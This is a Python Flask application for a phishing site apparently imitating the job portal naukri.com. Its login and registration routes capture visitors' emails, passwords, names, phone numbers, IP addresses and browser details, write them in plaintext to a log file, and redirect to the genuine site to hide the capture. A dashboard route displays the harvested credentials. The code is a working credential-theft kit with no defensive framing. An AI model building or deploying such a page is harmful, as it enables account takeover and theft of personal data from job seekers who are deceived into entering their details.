from flask import Flask, render_template, request, redirect, url_for
import datetime
import os

app = Flask(__name__)

# Ensure logs directory exists
if not os.path.exists("logs"):
    os.makedirs("logs")

LOG_FILE = "logs/phishing_attempts.log"
JOB_SITE = "https://www.naukri.com"  # Final redirect site


def log_attempt(action, data):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} | {action} | {data}\n")


@app.route('/')
def index():
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    log_attempt("LOGIN", f"IP: {user_ip}, UA: {user_agent}, Email: {email}, Password: {password}")

    return redirect(JOB_SITE)


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        fullname = request.form.get('fullname')
        email = request.form.get('email')
        password = request.form.get('password')
        phone = request.form.get('phone')
        user_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        log_attempt("REGISTER", f"IP: {user_ip}, UA: {user_agent}, Name: {fullname}, Email: {email}, Password: {password}, Phone: {phone}")

        # After registration → go back to fake login page
        return redirect(url_for('index'))

    return render_template('register.html')


@app.route('/dashboard')
def dashboard():
    attempts = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            attempts = f.readlines()
    return render_template('dashboard.html', attempts=attempts)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
